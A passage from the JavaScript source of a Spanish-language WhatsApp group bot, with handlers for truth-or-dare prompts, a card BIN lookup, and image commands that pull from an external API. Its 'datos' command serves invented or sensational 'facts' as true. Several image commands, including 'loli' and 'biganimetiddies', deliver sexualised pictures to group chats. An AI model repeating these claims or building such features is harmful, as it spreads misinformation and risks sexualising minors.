guapo']														
                	const faraon = shaddy[Math.floor(Math.random() * shaddy.length)]
					wnw = fs.readFileSync(`./testguapo.jpg`)						
					cnf.sendMessage(from, wnw, image, { caption: '*Que tan guapo eres*\n\n'+ faraon, quoted: mek })					
                    break

					case 'reto':		
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					const daare =['Te reto a poner en tu info de Whatsapp que te gusta Anuel por 24 horas','Te reto a decirle a tu crush que la amas y pasar cap en el grupo','Te reto a poner en tu estado que buscas pareja','Te reto a poner en tu perfil la foto de tu crush','Te reto a decirle a alguien que te gusta...','Te reto a mandar un audio cantando','Te reto mandar audio hablando con vos de niña de 5 años','Te reto a poner en tu info que te gusta tu vecin@','Te reto mandar una foto tuya sin taparte la cara','Te reto a decir que apodo tenias cuando eras un/a niñ@ aun','Te reto a enviar un vídeo bailando','Te reto a enviar el último meme que allas visto','Te reto a enviar tu canción favorita']
					const deer = daare[Math.floor(Math.random() * daare.length)]
				    wbw = fs.readFileSync(`./alcatraz.jpg`)							
				    cnf.sendMessage(from, wbw, image, { quoted: mek, caption: '*Reto 😈*\n\n'+ deer })					
                    break	
                    									
   					/*
case 'verdad':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					const trrut =['Con quien de los que están aqui en el grupo te besarías? (etiqueta)','¿Alguna vez te ha gustado alguien? ¿Cuanto tiempo?','Alunga vez te llegó a gustar el/la herman@ de tu mejor amig@?','Cuantos años tienes?','Cuanto tiempo ah pasado desde que diste tu último beso?','Te gustan los chicos o las chicas o ambos?','Que opinas sobre BTS','Que opinas sobre l@s administradores','Tienes novi@?','Cuantas veces te as sentido ignorad@ por tu pareja o insuficiente para el/ella?','Que opinas de la nueva política de Whatsapp?','Que opinas sobre Telegram?','Tienes canal de Youtube?','Que opinas sobre Este bot?','Que opinas sobre el grupo?','Que tal te parece esta función de verdad o reto?']
					const ttrrth = trrut[Math.floor(Math.random() * trrut.length)]
					wuw = fs.readFileSync(`./alcatraz.jpg`)						
					cnf.sendMessage(from, wuw, image, { caption: '*Verdad😇*\n\n'+ ttrrth, quoted: mek })
					 break
*/
case 'datos':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					const trrut  = ['☇ El ser  humano tiene tanto pelo como un chimpancé.','☇ Abrazar la almohada al dormir significa que eres una persona solitaria.','☇ Los cerdos pueden comerse hasta un cuerpo humano entero.','☇ El 85% de las mujeres se deprimen por su aspecto fisico.','☇ Los demonios suelen tener forma de niños y aparecen más comunmente en los sueños.','☇ Solo se ha explorado el 5% de los mares en el mundo por lo que se dice que hay animales escalofriantes.','☇ Los payasos suelen ser el mayor miedo de las personas.\n\n(Cual es el tuyo)','☇ Los mosquitos son los causantes de 500 mil muertes al año en todo el mundo.','☇ En 1986 era común ver tablas de ouijas en los cementerios.','☇ Según algunos canibales la parte del ser humano que más les gusta son los ojos.','☇ Las personas que más rien suelen ser las más solitarias o menos felices.','☇ Lo que más se vende en la deep web es veneno y carne humana.','☇ Se dice que los gatos pueden viajar entre el mundo de los muertos y vivos.','☇ Las personas que hablan solas mientras duermen es posible que no esten hablando solas.','☇ Los espíritus tienden a ser más atraídos por los silbidos.', '☇ El lugar donde tienes más probabilidades de morir es en tu propia casa.', '☇ Se dice que en donde está ubicado Disney.\nExistía un cementerio donde rondaban demonios.', '☇ En la deep web venden carne humana recién cortada.', '☇ Si estornudas muy fuerte podrías quebrarte una costilla.', '☇ Por algún motivo los caníbales no comen personas tatuadas.', '☇ Si te miras 10 minutos en el espejo tu cerebro imagina monstruos.', '☇ Si sueñas que te caes es porque tu cerebro te envía un mensaje de te quedaste sin aire.', '☇ Cada 100 años hay una pandemia en el mundo.', '☇ Si lloras de la nada es porque una persona en el mundo murió y nadie lloro por esa persona.', '☇ Es imposible imaginar un color nuevo.', '☇  Los venados comen todo tipo de animales, hasta humanos.', '☇ Las risas que escuchas en programas de TV fueron grabadas en 1950.\nEstas escuchando a gente muerta.', '☇ En Japón, la llama de paz de Hiroshima lleva prendida desde 1954 y permanecerá encendida hasta que se destruyan todas las bandas nucleares del planeta.', '☇ En el imperio romano molían los cerebros de las ratas para hacer pasta de dientes.', '☇ Según la astronomía:\nCuando le pides un deseo a una estrella fugaz\nen realidad lo hiciste millones de años tarde.\nPorque la estrella murió.', '☇ La mayoría de supuestas casas o lugares embrujados tienen en común la presencia de ondas bajas de frecuencia (infrasonido) que pueden causar miedo o depresión en los humanos.', '☇ Peter Pan es un ángel que lleva a los niños muertos al cielo.', '☇ Desde 2001, todos los 2 de Julio se festeja el día mundial del ovni.\nEn conmemoración al famoso incidente de Roswell de 1947.\nSegún los reportes, una supuesta nave colisiono en el desierto de Nuevo México.', '☇ Si buscas 52.376552 en google maps, podrás ver a un hombre arrastrando un cadáver hacia un lago.', '☇ Si buscas 5.198303 en google maps, podrás ver a un hombre arrastrando un cadáver hacia un lago.', '☇ El doctor Bing Liu estaba por encontrar la cura del covid-19 y el día 2 de Mayo lo encontraron sin vida.', '☇ Gloomy sunday es conocida como la canción suicida, más de 100 personas se suicidaron al escucharla.', '☇ Existe una condición llamada falso despertar.\nOcurre cuando estas soñando que estas despierto pero aún te encuentras en un sueño profundo.', '☇ Cuando hacen un exorcismo, el demonio suele esconderse, para que crean que salió de aquella persona.', '☇ Lilith fue la primera de esposa de Adán.', '☇ Los ojos hacen más ejercicio que las piernas.']
const ttrrth = trrut[Math.floor(Math.random() * trrut.length)]
					wuw = fs.readFileSync(`./datos.jpg`)						
					cnf.sendMessage(from, wuw, image, { caption: ttrrth, quoted: mek })
					 break

/////////////////// COMANDOS +18 //////////////////////

				  case 'nsfw':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	               if (!isGroup) return reply(mess.only.group)
			       if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`para activar usa : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
					if (isNsfw) return reply('Ya activa')
					nsfww.push(from)
					fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
					reply('Activar correctamente la función nsfw')
					cnf.sendMessage(from, `Libre para usar comandos HENTAI :v`, text)
					} else if (Number(args[0]) === 0) {
					if (!isNsfw) return reply('Desactivado')
					var ini = nsfww.indexOf(from)
					nsfww.splice(ini, 1)
					fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
					reply('Desactive con éxito la función nsfw')
					} else {
					reply('1 para encender, 0 para apagar')
					}
					break


case 'checkbin':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!c) return fakegroup('Donde esta el número?')
cc = args.join(' ')
uwus = ['```']
	anu = await fetchJson(`https://lookup.binlist.net/${cc}`)
reply(`${uwus}Numero : ${cc}
Esquema : ${anu.scheme}
Marca : ${anu.brand}
Tipo : ${anu.type}
Pais : ${anu.country.emoji}${anu.country.name}${anu.country.emoji}
Emoji : ${anu.country.emoji}

Localización : 
Longitud ${anu.country.latitude}
Latitud ${anu.country.longitude}

Banco : ${anu.bank.name}
Numero : ${anu.bank.phone}
Url : ${anu.bank.url}
Ciudad : ${anu.bank.city}${uwus}`)
break
/*
case 'unirse':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!c) return reply('Donde esta el Link de el grupo????')
 ar = args.join(' ')
 teks = `${ar.replace('https://chat.whatsapp.com/', '')}`
 cnf.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
break
*/

            /*case 'telesticker':		  
                    if (args.length == 0) return reply(`[❗] Ejemplo: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api-alc.herokuapp.com/api/download/telesticker?url=${ini_url}&apikey=M`)
                    ini_sticker = ini_url.result
                    for (sticker_ in ini_sticker) {
                        ini_buffer = await getBuffer(ini_sticker[sticker_])
                        cnf.sendMessage(from, ini_buffer, sticker)
                    }
                    break*/








/*case 'i':
       if (!isGroup) return reply('esta función es solo para grupos')
       if (!isNsfw) return reply(`La función nsfw aún no está activa en este grupo\nEscribe ${prefix}nsfw 1`)
       reply(mess.wait)
       anu = await fetchJson(`https://x-restapi.herokuapp.com/api/kemonomimi-nsfw?apikey=BETA`)
       yoiz = await getBuffer(anu.url)
       buttons = [{buttonId: `kemono2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`Nota: No hacer spam`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
         break
*/

////////////////RANDOM IMAGENES////////////////

         case 'badgirl': 
         case 'darkgirl':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/chicas/badgirl?&apikey=${confukey}`)					
buttons = [{buttonId: `badgirl`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐁𝐚𝐝𝐆𝐢𝐫𝐥`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
            } catch {
            reply('Lo siento ah ocurrido un error')
            }
	 	 break

////////////////

         case 'brasil': 
         case 'brasileñas':
         case 'menina':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/chicas/brasil?&apikey=${confukey}`)					
buttons = [{buttonId: `brasil`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐁𝐫𝐚𝐬𝐢𝐥`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break

//////////////

         case 'dog': 
         case 'perros':
         case 'dogs':
         case 'perro':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/random-imagen/dog?apikey=${confukey}`)					
buttons = [{buttonId: `dog`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐃𝐨𝐠𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break

//////////////////
         case 'cat': 
         case 'cats':
         case 'gato':
         case 'gatos':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/random-imagen/cat?apikey=${confukey}`)					
buttons = [{buttonId: `cat`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐂𝐚𝐭𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break

         case 'panda': 
         case 'pandas':
         case 'bear':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/random-imagen/panda?apikey=${confukey}`)					
buttons = [{buttonId: `panda`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐏𝐚𝐧𝐝𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break
         case 'koala': 
         case 'koalas':       
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/random-imagen/koala?apikey=${confukey}`)					
buttons = [{buttonId: `koala`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐊𝐨𝐚𝐥𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break
         case 'fox': 
         case 'foxs':
         case 'zorro':
         case 'zorros':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/random-imagen/fox?apikey=${confukey}`)					
buttons = [{buttonId: `fox`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐅𝐨𝐱`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break
////////////////

         case 'muslo': 
         case 'muslos':        
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/chicas/muslos?&apikey=${confukey}`)					
buttons = [{buttonId: `muslos`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐌𝐮𝐬𝐥𝐨𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break

////////////////

         case 'chica': 
         case 'chicas':  
         case 'girls':
         case 'random-girls':      
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/chicas/random-girls?&apikey=${confukey}`)					
buttons = [{buttonId: `girls`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐑𝐚𝐧𝐝𝐨𝐦-𝐆𝐢𝐫𝐥𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break

////////////////

         case 'say':  
         case 'saycat':
         case 'say-cat':      
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/chicas/say_cat?&apikey=${confukey}`)					
buttons = [{buttonId: `saycat`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐒𝐚𝐲-𝐂𝐚𝐭`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break

////////////////

         case 'ari':  
         case 'arigameplay':
         case 'ari-gameplay':   
         case 'ari-gameplays':
         case 'arigameplays':
         case 'chica-gamer':   
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	reply(mess.wait)
	    	try {
		 buffer1 = await getBuffer(`https://api-alc.herokuapp.com/api/chicas/ari?&apikey=${confukey}`)					
buttons = [{buttonId: `ari`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐫𝐢-𝐆𝐚𝐦𝐞𝐩𝐥𝐚𝐲𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              cnf.relayWAMessage(prep)
           } catch {
           reply('Lo siento ah ocurrido un error')
           }
	 	 break


////////////////


////////////////RANDOM ANIMES////////////////

case 'wallpaper':
case 'fondo':
case 'wp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/wallpaper?&apikey=${confukey}`)
buttons = [{buttonId: `wallpaper`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`??𝐧𝐢𝐦𝐞 𝐖𝐚𝐥𝐥𝐩𝐚𝐩𝐞𝐫`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'wallpaper2':
case 'fondo2':
case 'wp2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/wallpaper2?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `wallpaper2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐖𝐚𝐥𝐥𝐩𝐚𝐩𝐞𝐫 𝟐`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'padoru':
case 'pador':
case 'pandoru':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/padoru?&apikey=${confukey}`)
buttons = [{buttonId: `padoru`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐏𝐚𝐝𝐨𝐫𝐮`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'waifu':
case 'anime':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/waifu?&apikey=${confukey}`)
buttons = [{buttonId: `waifu`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐖𝐚𝐢𝐟𝐮`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

///////////////


case 'biganimetiddies':
case 'tiddies':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/biganimetiddies?apikey=${confukey}`)
buttons = [{buttonId: `tiddies`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐁𝐢𝐠𝐓𝐢𝐝𝐝𝐢𝐞𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'megu':
case 'megumi':
case 'megumin':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/megumin?&apikey=${confukey}`)
buttons = [{buttonId: `megu`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐌𝐞𝐠𝐮𝐦𝐢𝐧`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'megu2':
case 'megumi2':
case 'megumin2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/megumin2?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `megu2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐌𝐞𝐠𝐮𝐦𝐢𝐧 𝟐`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'neko':
case 'nekos':
case 'furro':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/neko?&apikey=${confukey}`)
buttons = [{buttonId: `neko`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐞𝐤𝐨`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'neko2':
case 'nekos2':
case 'furros':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/awoo?&apikey=${confukey}`)
buttons = [{buttonId: `neko2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐞𝐤𝐨𝟐`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'loli':
case 'lolis':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/loli?&apikey=${confukey}`)
buttons = [{buttonId: `loli`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐋𝐨𝐥𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'loli2':
case 'lolis2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/loli2?&apikey=${confukey}`)
